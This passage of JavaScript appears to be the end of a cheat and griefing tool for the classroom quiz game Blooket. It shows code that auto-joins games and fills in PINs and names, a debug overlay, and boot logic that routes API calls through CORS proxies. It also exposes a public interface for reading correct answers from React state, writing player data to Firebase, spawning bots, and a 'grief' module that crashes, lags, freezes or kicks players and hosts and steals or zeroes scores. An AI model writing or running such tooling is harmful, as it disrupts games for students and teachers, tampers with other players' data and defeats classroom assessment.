        if (maxlen > 0 && maxlen <= 8) score += 3;
        if (/game|pin|code|join/i.test(el.placeholder || '')) score += 3;
        if (/name|nick/i.test(el.placeholder || '')) score -= 4;
        return { el, score };
      }).sort((a, b) => b.score - a.score);
      return scored[0]?.score > 0 ? scored[0].el : null;
    };

    const SUBMIT_SELECTORS = [
      'button[type="submit"]:not([disabled])',
      'button[class*="submitButton"]:not([disabled])',
      'button[class*="SubmitButton"]:not([disabled])',
      'div[role="button"][class*="joinButton"]',
      '[role="button"][class*="submitButton"]'
    ];

    const findSubmit = (nearInput = null) => {
      for (const sel of SUBMIT_SELECTORS){
        const el = document.querySelector(sel);
        if (isVisible(el) && !el.disabled) return el;
      }
      const btns = [...document.querySelectorAll('button, [role="button"]')]
        .filter(b => isVisible(b) && !b.disabled);
      const verb = btns.find(b =>
        /^(join|enter|play|next|start|submit|continue|go)\b/i.test(textOf(b))
      );
      if (verb) return verb;
      const candidates = btns.filter(b => {
        const cls = String(b.className || '');
        return /submit|join|next|primary/i.test(cls);
      });
      if (candidates.length === 1) return candidates[0];
      if (nearInput?.form){
        const inForm = nearInput.form.querySelector('button:not([disabled])');
        if (isVisible(inForm)) return inForm;
      }
      return null;
    };

    const NAME_SELECTORS = [
      'input[placeholder*="nickname" i]',
      'input[placeholder*="name" i]',
      'input[name="name"]',
      'input[aria-label*="name" i]',
      'input[type="text"]:not([readonly])'
    ];

    const findNameInput = () => {
      for (const sel of NAME_SELECTORS){
        const el = document.querySelector(sel);
        if (isVisible(el) && !el.readOnly) return el;
      }
      const all = [...document.querySelectorAll('input')].filter(el =>
        isVisible(el) && !el.readOnly
      );
      const scored = all.map(el => {
        let score = 0;
        if (/name|nick/i.test(el.placeholder || '')) score += 5;
        if (el.type === 'text') score += 2;
        if ((Number(el.maxLength) || 0) > 8) score += 1;
        if (el.type === 'tel') score -= 4;
        return { el, score };
      }).sort((a, b) => b.score - a.score);
      return scored[0]?.score > 0 ? scored[0].el : null;
    };

    const findBlook = (target) => {
      const needle = target.toLowerCase().trim();
      const pool = [...document.querySelectorAll('[alt], [aria-label], img, button, [role="button"]')];
      for (const el of pool){
        const hay = textOf(el);
        if (hay === needle) return el;
      }
      for (const el of pool){
        const hay = textOf(el);
        if (hay.includes(needle)) return el;
      }
      return null;
    };

    const detectError = () => {
      const texts = [...document.querySelectorAll('div, span, p')]
        .filter(isVisible)
        .map(el => (el.textContent || '').trim().toLowerCase());
      return texts.find(t =>
        /(game (not found|doesn't exist|does not exist)|invalid (pin|code)|no game|sorry)/i.test(t)
      ) || null;
    };

    const runStage1 = async () => {
      for (let attempt = 1; attempt <= 3; attempt++){
        const pinInput = findPinInput();
        if (!pinInput){
          logJoin('warn', `Stage 1 attempt ${attempt}: PIN input not found.`);
          await sleep(600);
          continue;
        }

        logJoin('info', `Stage 1 attempt ${attempt}: entering PIN.`);
        pinInput.focus();
        setReactValue(pinInput, pin);
        await sleep(300);

        const btn = findSubmit(pinInput);
        if (!btn){
          logJoin('warn', `Stage 1 attempt ${attempt}: submit button not found.`);
          pinInput.dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', bubbles: true }));
          pinInput.dispatchEvent(new KeyboardEvent('keypress', { key: 'Enter', bubbles: true }));
          pinInput.dispatchEvent(new KeyboardEvent('keyup',   { key: 'Enter', bubbles: true }));
          await sleep(800);
        } else {
          reactClick(btn);
          logJoin('info', `Stage 1 attempt ${attempt}: PIN submitted.`);
        }

        const outcome = await Promise.race([
          waitFor(findNameInput, { timeout: 5000 }).then(el => ({ kind: 'name', el })),
          waitFor(detectError,   { timeout: 5000 }).then(msg => ({ kind: 'error', msg }))
        ]).catch(() => ({ kind: 'timeout' }));

        if (outcome.kind === 'name'){
          logJoin('ok', 'Stage 1 complete.');
          return true;
        }
        if (outcome.kind === 'error'){
          logJoin('err', `PIN rejected: ${outcome.msg}`);
          return false;
        }
        logJoin('warn', `Stage 1 attempt ${attempt}: no transition, retrying.`);
      }
      return false;
    };

    const runStage2 = async () => {
      for (let attempt = 1; attempt <= 3; attempt++){
        const nameInput = findNameInput();
        if (!nameInput){
          logJoin('warn', `Stage 2 attempt ${attempt}: name input not found.`);
          await sleep(500);
          continue;
        }

        logJoin('info', `Stage 2 attempt ${attempt}: entering name.`);
        nameInput.focus();
        setReactValue(nameInput, name);
        await sleep(300);

        if (blook){
          const blookEl = findBlook(blook);
          if (blookEl){
            reactClick(blookEl);
            logJoin('info', `Selected blook: ${blook}.`);
            await sleep(400);
          } else {
            logJoin('warn', `Blook "${blook}" not found — using default.`);
          }
        }

        const btn = findSubmit(nameInput);
        if (!btn){
          nameInput.dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', bubbles: true }));
          await sleep(600);
        } else {
          reactClick(btn);
          logJoin('info', `Stage 2 attempt ${attempt}: submitted.`);
        }

        const ok = await waitFor(() => {
          if (!/\/play/i.test(location.pathname)) return true;
          if (document.querySelector('canvas')) return true;
          if (!findNameInput()) return true;
          return false;
        }, { timeout: 6000 }).then(() => true).catch(() => false);

        if (ok){
          logJoin('ok', 'Stage 2 complete — in lobby.');
          return true;
        }
        logJoin('warn', `Stage 2 attempt ${attempt}: no transition, retrying.`);
      }
      return false;
    };

    (async () => {
      try {
        logJoin('info', 'Waiting for play page…');
        await waitFor(() => findPinInput() || findNameInput(), { timeout: 20000 });
        dismissCookies();
        await sleep(400);

        if (findPinInput()){
          const stage1Ok = await runStage1();
          if (!stage1Ok){
            const err = detectError();
            if (err) logJoin('err', `Blocked: ${err}`);
            else logJoin('warn', 'Stage 1 failed — leaving form to user.');
            try { toast('warn', 'Auto-join', 'PIN step failed — finish manually.'); } catch {}
            return;
          }
        }

        const stage2Ok = await runStage2();
        if (!stage2Ok){
          logJoin('warn', 'Stage 2 failed — leaving form to user.');
          try { toast('warn', 'Auto-join', 'Name step failed — finish manually.'); } catch {}
          return;
        }

        try { document.body.dataset.panelOpen = 'true'; } catch {}
      } catch (e){
        logJoin('err', `Auto-join gave up: ${e.message}`);
        try { toast('warn', 'Auto-join', 'Finish the form manually.'); } catch {}
      }
    })();
  })();

  /* ============================================================
     22. DEBUG OVERLAY — mirrors last 8 log lines (?debug=1)
     ============================================================ */
  (function debugOverlay(){
    const params = new URLSearchParams(location.search);
    const mode = params.get('debug');
    if (!mode) return;
    const always = mode === 'always';

    const box = document.createElement('div');
    box.style.cssText = [
      'position:fixed',
      'top:12px',
      'left:12px',
      'z-index:2147483647',
      'max-width:min(420px, 60vw)',
      'max-height:40vh',
      'overflow:hidden',
      'background:rgba(10,12,16,.92)',
      'border:1px solid rgba(0,212,255,.35)',
      'border-radius:4px',
      'padding:8px 10px',
      'font:11px/1.5 "SF Mono", ui-monospace, Consolas, monospace',
      'color:#d7dee9',
      'box-shadow:0 8px 24px rgba(0,0,0,.55)',
      'pointer-events:auto',
      'user-select:none'
    ].join(';');

    const head = document.createElement('div');
    head.textContent = 'BP · debug';
    head.style.cssText = 'font-weight:700;letter-spacing:.14em;text-transform:uppercase;color:#00d4ff;font-size:9.5px;margin-bottom:4px;';
    box.appendChild(head);

    const out = document.createElement('div');
    out.style.cssText = 'display:flex;flex-direction:column;gap:1px;';
    box.appendChild(out);

    try { document.documentElement.appendChild(box); } catch { return; }

    const KIND_COLOR = {
      ok:   '#3ddc84',
      info: '#00d4ff',
      warn: '#ffb020',
      err:  '#ff4d5e'
    };

    const lines = [];

    function push(kind, tag, msg){
      const t = new Date();
      const p = n => String(n).padStart(2, '0');
      const ts = `${p(t.getHours())}:${p(t.getMinutes())}:${p(t.getSeconds())}`;
      lines.push({ ts, kind, tag, msg: String(msg).slice(0, 160) });
      if (lines.length > 8) lines.shift();

      out.replaceChildren();
      for (const l of lines){
        const row = document.createElement('div');
        row.style.cssText = 'display:flex;gap:6px;align-items:baseline;';
        const t1 = document.createElement('span');
        t1.textContent = l.ts;
        t1.style.cssText = 'color:#4d5868;flex:0 0 auto;';
        const t2 = document.createElement('span');
        t2.textContent = `[${l.tag}]`;
        t2.style.cssText = `color:${KIND_COLOR[l.kind] || '#8b97a8'};flex:0 0 auto;font-weight:600;`;
        const t3 = document.createElement('span');
        t3.textContent = l.msg;
        t3.style.cssText = 'color:#8b97a8;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;flex:1 1 auto;';
        row.append(t1, t2, t3);
        out.appendChild(row);
      }
    }

    if (logEl){
      try {
        const orig = logEl.appendChild.bind(logEl);
        logEl.appendChild = function(node){
          try {
            if (node?.tagName === 'P'){
              const kind = node.dataset?.kind || 'info';
              const tagEl = node.querySelector('.tag');
              const tag = tagEl ? tagEl.textContent.replace(/[\[\]]/g, '') : 'panel';
              const text = node.textContent || '';
              const msg = text.replace(/^\d{2}:\d{2}:\d{2}\s*\[[^\]]+\]\s*/, '');
              push(kind, tag, msg);
            }
          } catch {}
          return orig(node);
        };
      } catch {}
    }

    if (!always){
      setTimeout(() => {
        try {
          box.style.transition = 'opacity .4s ease';
          box.style.opacity = '0';
          setTimeout(() => box.remove(), 500);
        } catch {}
      }, 45000);
    }

    box.addEventListener('click', () => box.remove());
    push('ok', 'debug', 'Overlay attached.');
  })();

  /* ============================================================
     23. DOCTOR
     ============================================================ */
  function doctor(){
    const g = react.game();
    const report = {
      version: VERSION,
      host: location.hostname,
      context,
      onBlooket: isBlooketOrigin,
      panelMounted: !!$('#panel'),
      logMounted: !!logEl,
      toastMounted: !!toastEl,
      mode: state.mode,
      inGame: state.inGame,
      react: {
        node: !!g?.node,
        path: react.path,
        game: !!g?.game,
        client: !!g?.client,
        controller: !!g?.controller
      },
      firebase: { available: fb.available },
      players: state.players.length,
      flagged: [...state.flagged],
      session: { ...state.session },
      running: { ...state.running },
      netMode: isBlooketOrigin ? 'direct' : 'proxy-eligible'
    };
    log('info', 'doctor', JSON.stringify(report, null, 2));
    return report;
  }

  /* ============================================================
     24. BOOT
     ============================================================ */
  function boot(){
    log('ok', 'panel', `Engine online v${VERSION} (${context}).`);

    if (_panelMissing){
      log('warn', 'panel', 'No panel DOM found. Inject index.html before engine.js.');
    }

    if (isBlooketOrigin){
      log('info', 'panel', 'On Blooket — direct fetch, live hooks.');
      detectMode();
    } else if (context === 'file' || context === 'local'){
      log('warn', 'panel', `Running from ${context}. API calls will use CORS proxies.`);
    } else {
      log('info', 'panel', `Running on ${context}. Proxies enabled for API calls.`);
    }

    let probeAttempts = 0;
    const probe = () => {
      probeAttempts++;
      const n = react.node({ scan: true });
      if (n){
        log('ok', 'react', `Node via ${react.path}.`);
        if (state.mode === 'unknown') detectMode();
        log(fb.available ? 'ok' : 'warn', 'firebase',
            fb.available ? 'liveGameController attached.' : 'No controller yet.');
        bus.emit('react-ready');
        return;
      }
      if (probeAttempts <= 3){
        log('warn', 'react', `No node yet (attempt ${probeAttempts}).`);
      }
      if (probeAttempts < CONFIG.probeFloor) setTimeout(probe, 5000);
    };
    setTimeout(probe, 1500);

    if ($('[data-module="players"] [data-field="autoScan"]')?.checked) startAutoScan();

    safeOn(document, 'visibilitychange', () => {
      if (!document.hidden && state.inGame) scanPlayers().catch(() => {});
    });
  }

  document.readyState === 'loading'
    ? document.addEventListener('DOMContentLoaded', boot, { once: true })
    : boot();

  /* ============================================================
     25. PUBLIC SURFACE
     ============================================================ */
  window.BP = Object.freeze({
    state,
    actions,
    log, toast, doctor,
    on: bus.on.bind(bus),
    off: bus.off.bind(bus),

    context,
    isBlooketOrigin,
    panelMounted: !!$('#panel'),

    modules: { setBadge, readField },

    react: {
      node:     () => react.node(),
      game:     () => react.game(),
      answer:   () => react.answer(),
      correct:  q => react.correct(q),
      question: () => react.question()
    },

    firebase: {
      get available(){ return fb.available; },
      set:         (p, v) => fb.set(p, v),
      remove:      p => fb.remove(p),
      get:         p => fb.get(p),
      writePlayer: (n, p) => fb.writePlayer(n, p),
      snapshot:    () => fb.snapshot()
    },

    mode: {
      detect:  detectMode,
      current: () => state.mode,
      info:    () => MODES[state.mode]
    },

    grief: {
      crash:    n => grief.crash(n),
      nuke:     n => grief.nuke(n),
      lag:      n => grief.lag(n),
      freeze:   n => grief.freeze(n),
      mute:     n => grief.mute(n),
      zero:     n => grief.zero(n),
      stealFull:    n => grief.stealFull(n),
      stealPercent: (n, p) => grief.stealPercent(n, p),
      stealSwap:    n => grief.stealSwap(n),
      crashHost:    () => grief.crashHost(),
      lagHost:      () => grief.lagHost(),
      freezeHost:   () => grief.freezeHost(),
      disconnectHost: () => grief.disconnectHost(),
      nukeLobby:    () => grief.nukeLobby(),
      freezeAll:    () => grief.freezeAll(),
      muteAll:      () => grief.muteAll(),
      zeroEveryone: () => grief.zeroEveryone(),
      stealFromAll: () => grief.stealFromAll(),
      drainEveryone:() => grief.drainEveryone(),
      reverseScores:() => grief.reverseScores(),
      scrambleNames:() => grief.scrambleNames(),
      forceKickAll: () => grief.forceKickAll()
    },

    detect: {
      mods: () => detector.run(),
      kick: () => detector.kick()
    },

    spam: { spawn: spawnBots },

    overrides: {
      setScore, setName, sendChat, setTimer,
      forceEndRound, swapBlook, setPrimaryValue
    },

    loops: {
      startAutoAnswer, stopAutoAnswer,
      startGrind, stopGrind,
      startAutoScan, stopAutoScan
    },

    scan: scanPlayers,
    panel: { open: () => actions['open-panel'](), close: () => actions['close-panel']() },
    utils: { escapeHtml, escapeSelector, generateName, store, readProp, normalizePlayerMap },

    config: CONFIG,
    version: VERSION
  });

  // Post-boot diagnostic if panel is missing
  if (_panelMissing){
    try { console.warn('[BP] engine.js loaded without #panel — check your injection order.'); } catch {}
  }

})();
}
